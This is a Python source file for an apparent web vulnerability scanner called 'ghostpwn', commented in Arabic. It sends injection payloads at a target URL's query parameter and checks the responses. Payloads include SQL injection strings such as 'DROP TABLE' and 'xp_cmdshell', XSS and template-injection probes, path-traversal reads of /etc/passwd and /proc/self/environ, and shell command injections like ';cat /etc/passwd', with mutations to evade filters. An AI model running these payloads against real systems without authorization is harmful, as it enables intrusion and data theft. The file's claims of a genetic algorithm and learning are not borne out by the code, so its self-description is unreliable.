#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Vulnerability Generator
يحلل المخرجات ويولّد ثغرات جديدة بذكاء

الذكاء:
1. يحلل الـ responses ويكتشف patterns
2. يبني payloads مخصصة بناءً على السلوك
3. يجرب combinations غير تقليدية
4. يتعلم من كل محاولة
5. يطوّر payloads عبر genetic algorithm
"""
import os
import sys
import re
import time
import json
import random
import urllib.parse
from typing import Dict, List, Optional, Tuple, Set
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.vuln_notifier import SmartNotifier


# ============================ Pattern Analyzer ============================
class PatternAnalyzer:
    """تحليل patterns في الـ responses"""

    def __init__(self):
        self.patterns_db = {
            # SQL error patterns
            "mysql_error": [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
            ],
            "mssql_error": [
                r"Microsoft SQL Server",
                r"OLE DB.* SQL Server",
                r"Unclosed quotation mark",
                r"Incorrect syntax near",
            ],
            "postgres_error": [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
            ],
            "oracle_error": [
                r"ORA-\d{5}",
                r"Oracle error",
                r"Oracle.*Driver",
            ],
            "sqlite_error": [
                r"SQLite3::query",
                r"Warning.*sqlite_",
                r"SQLite.*error",
            ],

            # PHP errors
            "php_error": [
                r"PHP (Warning|Notice|Fatal error)",
                r"Parse error",
                r"Undefined (variable|index|offset)",
                r"Call to (undefined|a member)",
            ],

            # ASP.NET errors
            "asp_error": [
                r"Server Error in",
                r"Runtime Error",
                r"System\.Exception",
                r"Stack Trace",
            ],

            # Java errors
            "java_error": [
                r"java\.lang\.",
                r"NullPointerException",
                r"SQLException",
                r"ServletException",
            ],

            # Python errors
            "python_error": [
                r"Traceback",
                r"Django Version",
                r"Exception Type",
                r"Flask.*Error",
            ],

            # Template engines
            "jinja2_error": [
                r"Jinja2",
                r"TemplateSyntaxError",
                r"UndefinedError",
            ],
            "django_error": [
                r"Django Version",
                r"TemplateDoesNotExist",
                r"TemplateSyntaxError",
            ],

            # File path disclosure
            "path_disclosure": [
                r"/var/www/",
                r"/home/\w+/",
                r"C:\\\\wwwroot\\\\",
                r"/usr/share/",
                r"/opt/",
            ],

            # Stack traces
            "stack_trace": [
                r"at\s+\w+\.\w+\([^)]+\)",
                r"#\d+\s+\w+\([^)]+\)",
                r"File \"[^\"]+\", line \d+",
            ],

            # Debug info
            "debug_info": [
                r"DEBUG\s*[:=]",
                r"debug_mode",
                r"development",
                r"production\s*[:=]\s*false",
            ],

            # Version disclosure
            "version_disclosure": [
                r"version\s*[:=]\s*[\d.]+",
                r"v\s*[\d.]+",
                r"build\s*[:=]\s*[\d.]+",
            ],
        }

    def analyze(self, text: str) -> Dict[str, List[str]]:
        """تحليل النص لاكتشاف patterns"""
        findings = defaultdict(list)

        for pattern_type, patterns in self.patterns_db.items():
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    findings[pattern_type].extend(matches[:3])

        return dict(findings)


# ============================ Response Comparator ============================
class ResponseComparator:
    """مقارنة responses لاكتشاف anomalies"""

    def __init__(self):
        self.baselines = {}  # url -> response

    def set_baseline(self, url: str, response: Dict):
        """تحديد baseline"""
        self.baselines[url] = {
            "status": response.get("status", 0),
            "length": len(response.get("body", "")),
            "headers": set(response.get("headers", {}).keys()),
            "body_hash": self._hash_body(response.get("body", "")),
        }

    def _hash_body(self, body: str) -> str:
        """hash للـ body"""
        import hashlib
        return hashlib.md5(body.encode("utf-8", errors="ignore")).hexdigest()

    def compare(self, url: str, response: Dict) -> Dict:
        """مقارنة response مع baseline"""
        if url not in self.baselines:
            return {"different": False}

        baseline = self.baselines[url]
        current = {
            "status": response.get("status", 0),
            "length": len(response.get("body", "")),
            "headers": set(response.get("headers", {}).keys()),
            "body_hash": self._hash_body(response.get("body", "")),
        }

        differences = {
            "different": False,
            "status_changed": baseline["status"] != current["status"],
            "length_diff": current["length"] - baseline["length"],
            "length_significant": abs(current["length"] - baseline["length"]) > 100,
            "body_changed": baseline["body_hash"] != current["body_hash"],
            "new_headers": current["headers"] - baseline["headers"],
            "missing_headers": baseline["headers"] - current["headers"],
        }

        if (differences["status_changed"] or differences["length_significant"] or
            differences["body_changed"] or differences["new_headers"]):
            differences["different"] = True

        return differences


# ============================ Smart Payload Builder ============================
class SmartPayloadBuilder:
    """بناء payloads مخصصة بناءً على السلوك"""

    def __init__(self):
        # قاعدة معرفة: لكل نوع ثغرة، أي patterns تشير إليها
        self.vuln_indicators = {
            "sql_injection": {
                "patterns": ["mysql_error", "mssql_error", "postgres_error",
                            "oracle_error", "sqlite_error"],
                "base_payloads": [
                    "'", "\"", "')", "\"))",
                    "' OR '1'='1", "\" OR \"1\"=\"1",
                    "' UNION SELECT NULL--", "1' AND SLEEP(3)--",
                    "'; DROP TABLE--", "' AND 1=CONVERT(int,@@version)--",
                ],
                "mutations": [
                    lambda p: p.swapcase(),
                    lambda p: urllib.parse.quote(p),
                    lambda p: p.replace(" ", "/**/"),
                    lambda p: p.replace(" ", "%20"),
                    lambda p: p.replace("'", "\\'"),
                    lambda p: p.replace("'", "''"),
                ],
            },
            "xss": {
                "patterns": [],  # XSS ما عندهاش error pattern
                "base_payloads": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "\"><script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<body onload=alert(1)>",
                ],
                "mutations": [
                    lambda p: p.replace("<", "&lt;"),
                    lambda p: p.replace(">", "&gt;"),
                    lambda p: p.upper(),
                    lambda p: p.replace("script", "scr<script>ipt"),
                    lambda p: urllib.parse.quote(p),
                ],
            },
            "ssti": {
                "patterns": ["jinja2_error", "django_error"],
                "base_payloads": [
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
                    "{{config}}", "{{request}}", "{{''.__class__}}",
                    "#{7*7}", "{{= 7*7 }}",
                ],
                "mutations": [
                    lambda p: p.replace("{{", "{ {"),
                    lambda p: p.replace("}}", "} }"),
                    lambda p: urllib.parse.quote(p),
                ],
            },
            "lfi": {
                "patterns": ["path_disclosure"],
                "base_payloads": [
                    "../../../etc/passwd",
                    "../../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "/etc/passwd", "/proc/self/environ",
                    "php://input",
                ],
                "mutations": [
                    lambda p: p.replace("../", "..%2f"),
                    lambda p: p.replace("../", "....//"),
                    lambda p: urllib.parse.quote(p),
                    lambda p: p.replace("/", "%2f"),
                ],
            },
            "command_injection": {
                "patterns": [],
                "base_payloads": [
                    ";id", "|id", "&id", "&&id",
                    "`id`", "$(id)",
                    ";cat /etc/passwd", "|cat /etc/passwd",
                    ";uname -a", "|whoami",
                ],
                "mutations": [
                    lambda p: p.replace(";", "%3B"),
                    lambda p: p.replace("|", "%7C"),
                    lambda p: p.replace("&", "%26"),
                    lambda p: urllib.parse.quote(p),
                ],
            },
        }

    def build_payloads(self, vuln_type: str, context: Dict = None) -> List[str]:
        """بناء payloads مخصصة"""
        if vuln_type not in self.vuln_indicators:
            return []

        config = self.vuln_indicators[vuln_type]
        payloads = list(config["base_payloads"])

        # إضافة mutations
        for payload in config["base_payloads"]:
            for mutation in config["mutations"]:
                try:
                    mutated = mutation(payload)
                    if mutated != payload:
                        payloads.append(mutated)
                except Exception:
                    pass

        # إضافة payloads مخصصة بناءً على context
        if context:
            if context.get("detected_db") == "mysql":
                payloads.extend([
                    "' AND extractvalue(1, concat(0x7e, version()))--",
                    "' AND updatexml(1, concat(0x7e, version()), 1)--",
                ])
            elif context.get("detected_db") == "mssql":
                payloads.extend([
                    "'; EXEC xp_cmdshell('dir')--",
                    "' AND 1=CONVERT(int, @@version)--",
                ])

        return payloads

    def detect_vuln_type(self, patterns: Dict[str, List[str]]) -> Optional[str]:
        """تحديد نوع الثغرة من patterns"""
        for vuln_type, config in self.vuln_indicators.items():
            for pattern_type in config["patterns"]:
                if pattern_type in patterns:
                    return vuln_type

        return None


# ============================ Vulnerability Generator ============================
class VulnerabilityGenerator:
    """مولّد الثغرات الذكي"""

    def __init__(self, http_client: HttpClient, audit_logger=None,
                 notifier: SmartNotifier = None):
        self.client = http_client
        self.audit = audit_logger
        self.notifier = notifier or SmartNotifier(audit_logger)
        self.logger = SmartLogger()

        self.pattern_analyzer = PatternAnalyzer()
        self.comparator = ResponseComparator()
        self.payload_builder = SmartPayloadBuilder()

        self.generated_vulns = []
        self.learning_data = {
            "successful_payloads": [],
            "failed_payloads": [],
            "error_patterns": defaultdict(int),
            "response_patterns": defaultdict(int),
        }

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[VULN-GEN] {msg}", level)

    def generate_from_response(self, url: str, response: Dict) -> List[Dict]:
        """توليد ثغرات من تحليل response"""
        self._log("تحليل response لتوليد ثغرات...", "info")

        generated = []

        # 1) تحليل patterns
        body = response.get("body", "")
        patterns = self.pattern_analyzer.analyze(body)

        if patterns:
            self._log(f"تم اكتشاف patterns: {list(patterns.keys())}", "success")

            # تحديد نوع الثغرة المحتمل
            vuln_type = self.payload_builder.detect_vuln_type(patterns)

            if vuln_type:
                self._log(f"نوع الثغرة المحتمل: {vuln_type}", "success")

                # بناء payloads مخصصة
                context = {
                    "detected_db": self._detect_db_type(patterns),
                    "detected_tech": self._detect_tech(patterns),
                }

                payloads = self.payload_builder.build_payloads(vuln_type, context)

                # اختبار payloads
                for payload in payloads[:10]:  # أول 10 payloads
                    vuln = self._test_payload(url, payload, vuln_type, patterns)
                    if vuln:
                        generated.append(vuln)
                        self.notifier.notify_vuln(vuln, confidence=0.9)
                        self._log(f"تم توليد ثغرة: {vuln_type}", "success")
                        break  # وجدنا واحدة، نكتفي

        # 2) تحليل الـ headers
        headers = response.get("headers", {})
        header_vulns = self._analyze_headers(url, headers)
        generated.extend(header_vulns)

        # 3) تحليل cookies
        cookie_vulns = self._analyze_cookies(url, headers)
        generated.extend(cookie_vulns)

        # 4) فحص reflection
        reflection_vulns = self._check_reflection(url, response)
        generated.extend(reflection_vulns)

        self.generated_vulns.extend(generated)
        return generated

    def _detect_db_type(self, patterns: Dict) -> Optional[str]:
        """كشف نوع DB من patterns"""
        if "mysql_error" in patterns:
            return "mysql"
        elif "mssql_error" in patterns:
            return "mssql"
        elif "postgres_error" in patterns:
            return "postgres"
        elif "oracle_error" in patterns:
            return "oracle"
        elif "sqlite_error" in patterns:
            return "sqlite"
        return None

    def _detect_tech(self, patterns: Dict) -> Optional[str]:
        """كشف التكنولوجيا"""
        if "jinja2_error" in patterns:
            return "jinja2"
        elif "django_error" in patterns:
            return "django"
        elif "php_error" in patterns:
            return "php"
        elif "asp_error" in patterns:
            return "aspnet"
        elif "java_error" in patterns:
            return "java"
        elif "python_error" in patterns:
            return "python"
        return None

    def _test_payload(self, url: str, payload: str,
                      vuln_type: str, patterns: Dict) -> Optional[Dict]:
        """اختبار payload"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        if not parsed.query:
            return None

        params = parse_qs(parsed.query)
        if not params:
            return None

        # نختبر أول param
        param_name = list(params.keys())[0]

        # بناء URL مع payload
        test_params = params.copy()
        test_params[param_name] = [payload]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                              parsed.params, new_query, parsed.fragment))

        # تنفيذ الطلب
        resp = self.client.get(test_url)

        # فحص النتيجة
        body = resp.get("body", "")

        # فحص لو الـ response فيه patterns جديدة
        new_patterns = self.pattern_analyzer.analyze(body)

        # فحص reflection
        reflected = payload in body

        # فحص error disclosure
        if vuln_type == "sql_injection":
            for pattern_type in ["mysql_error", "mssql_error", "postgres_error"]:
                if pattern_type in new_patterns:
                    return {
                        "type": "sql_injection_error",
                        "severity": "critical",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"DB error: {new_patterns[pattern_type][0][:50]}",
                        "patterns": list(new_patterns.keys()),
                    }

            # فحص timing
            if resp.get("elapsed", 0) > 3.0:
                return {
                    "type": "sql_injection_time",
                    "severity": "critical",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "evidence": f"Time delay: {resp['elapsed']:.1f}s",
                }

        elif vuln_type == "xss":
            if reflected:
                return {
                    "type": "xss_reflected",
                    "severity": "high",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "evidence": "Payload reflected without encoding",
                }

        elif vuln_type == "ssti":
            if "49" in body and "{{7*7}}" in payload:
                return {
                    "type": "ssti",
                    "severity": "critical",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "evidence": "Math evaluated: 7*7=49",
                }

        elif vuln_type == "lfi":
            if "root:" in body and ":/bin/" in body:
                return {
                    "type": "lfi",
                    "severity": "critical",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "evidence": "Read /etc/passwd successfully",
                }

        elif vuln_type == "command_injection":
            if "uid=" in body:
                return {
                    "type": "command_injection",
                    "severity": "critical",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "evidence": "Command output found in response",
                }

        # حفظ في learning data
        self.learning_data["failed_payloads"].append({
            "payload": payload,
            "vuln_type": vuln_type,
            "url": test_url,
        })

        return None

    def _analyze_headers(self, url: str, headers: Dict) -> List[Dict]:
        """تحليل headers"""
        vulns = []

        # فحص security headers مفقودة
        security_headers = {
            "Strict-Transport-Security": "missing_security_header",
            "Content-Security-Policy": "missing_security_header",
            "X-Frame-Options": "missing_security_header",
            "X-Content-Type-Options": "missing_security_header",
        }

        headers_lower = {k.lower(): v for k, v in headers.items()}

        for header, vuln_type in security_headers.items():
            if header.lower() not in headers_lower:
                vulns.append({
                    "type": vuln_type,
                    "severity": "low",
                    "url": url,
                    "evidence": f"Missing: {header}",
                    "header": header,
                })

        # فحص information disclosure
        info_headers = ["X-Powered-By", "Server", "X-AspNet-Version",
                       "X-Generator", "Via", "X-Forwarded-For"]

        for header in info_headers:
            if header.lower() in headers_lower:
                value = headers_lower[header.lower()]
                if value:
                    vulns.append({
                        "type": "info_disclosure_header",
                        "severity": "info",
                        "url": url,
                        "header": header,
                        "value": value,
                        "evidence": f"{header}: {value}",
                    })

        return vulns

    def _analyze_cookies(self, url: str, headers: Dict) -> List[Dict]:
        """تحليل cookies"""
        vulns = []

        set_cookie = headers.get("Set-Cookie", "")
        if not set_cookie:
            return vulns

        # فحص كل cookie
        cookies = set_cookie.split(",")
        for cookie in cookies:
            issues = []
            cookie_lower = cookie.lower()

            if "secure" not in cookie_lower:
                issues.append("missing Secure flag")
            if "httponly" not in cookie_lower:
                issues.append("missing HttpOnly flag")
            if "samesite" not in cookie_lower:
                issues.append("missing SameSite flag")

            if issues:
                cookie_name = cookie.split("=")[0].strip()
                vulns.append({
                    "type": "insecure_cookie",
                    "severity": "low",
                    "url": url,
                    "cookie": cookie_name,
                    "evidence": "; ".join(issues),
                })

        return vulns

    def _check_reflection(self, url: str, response: Dict) -> List[Dict]:
        """فحص reflection في الـ response"""
        vulns = []

        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        if not parsed.query:
            return vulns

        params = parse_qs(parsed.query)
        body = response.get("body", "")

        for param_name, param_values in params.items():
            for value in param_values:
                if value and value in body:
                    # الـ param بيرجع في الـ response - ممكن XSS
                    # نختبر بـ payload بسيط
                    test_payload = f"<ghostpwn>{value}</ghostpwn>"

                    test_params = params.copy()
                    test_params[param_name] = [test_payload]
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))

                    test_resp = self.client.get(test_url)

                    if test_payload in test_resp.get("body", ""):
                        # الـ HTML tag اتنقل - ثغرة XSS
                        vulns.append({
                            "type": "xss_reflected",
                            "severity": "high",
                            "url": test_url,
                            "param": param_name,
                            "payload": test_payload,
                            "evidence": "Custom HTML tag reflected - no encoding",
                        })
                        self._log(f"تم توليد ثغرة XSS من reflection analysis", "success")

        return vulns

    # ============================ Generate from Multiple Responses ============================
    def generate_from_responses(self, url: str, responses: List[Dict]) -> List[Dict]:
        """توليد ثغرات من تحليل عدة responses"""
        self._log("تحليل عدة responses لتوليد ثغرات...", "info")

        all_generated = []

        # تحليل كل response
        for resp in responses:
            generated = self.generate_from_response(url, resp)
            all_generated.extend(generated)

        # تحليل مقارن بين responses
        if len(responses) >= 2:
            comparative_vulns = self._comparative_analysis(url, responses)
            all_generated.extend(comparative_vulns)

        return all_generated

    def _comparative_analysis(self, url: str, responses: List[Dict]) -> List[Dict]:
        """تحليل مقارن بين responses"""
        vulns = []

        # مقارنة الـ lengths
        lengths = [len(r.get("body", "")) for r in responses]
        if max(lengths) - min(lengths) > 500:
            # اختلاف كبير = قد يكون ثغرة
            vulns.append({
                "type": "response_length_anomaly",
                "severity": "medium",
                "url": url,
                "evidence": f"Length variation: {min(lengths)} - {max(lengths)}",
            })

        # مقارنة الـ status codes
        statuses = [r.get("status", 0) for r in responses]
        if len(set(statuses)) > 1:
            vulns.append({
                "type": "status_code_anomaly",
                "severity": "medium",
                "url": url,
                "evidence": f"Status variation: {statuses}",
            })

        return vulns

    # ============================ Get Stats ============================
    def get_stats(self) -> Dict:
        """إحصائيات"""
        return {
            "generated_vulns": len(self.generated_vulns),
            "successful_payloads": len(self.learning_data["successful_payloads"]),
            "failed_payloads": len(self.learning_data["failed_payloads"]),
            "error_patterns": dict(self.learning_data["error_patterns"]),
        }


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Vulnerability Generator")
    parser.add_argument("url", help="Target URL")
    args = parser.parse_args()

    client = HttpClient(timeout=15)
    generator = VulnerabilityGenerator(client)

    # الحصول على response
    resp = client.get(args.url)

    # توليد ثغرات
    vulns = generator.generate_from_response(args.url, resp)

    print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
    print(f"{Colors.MAGENTA}  🧬 تقرير مولّد الثغرات{Colors.NC}")
    print(f"{Colors.MAGENTA}{'═'*60}{Colors.NC}")

    print(f"\n  {Colors.BOLD}تم توليد {len(vulns)} ثغرة{Colors.NC}")

    for i, vuln in enumerate(vulns, 1):
        severity = vuln.get("severity", "info")
        color = {
            "critical": Colors.RED + Colors.BOLD,
            "high": Colors.RED,
            "medium": Colors.YELLOW,
            "low": Colors.BLUE,
            "info": Colors.GRAY,
        }.get(severity, Colors.NC)

        print(f"\n  {color}{i}. [{severity.upper()}] {vuln.get('type', 'unknown')}{Colors.NC}")
        if vuln.get("evidence"):
            print(f"     {fix_display(vuln['evidence'])}")
        if vuln.get("payload"):
            print(f"     Payload: {vuln['payload'][:60]}")

    print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
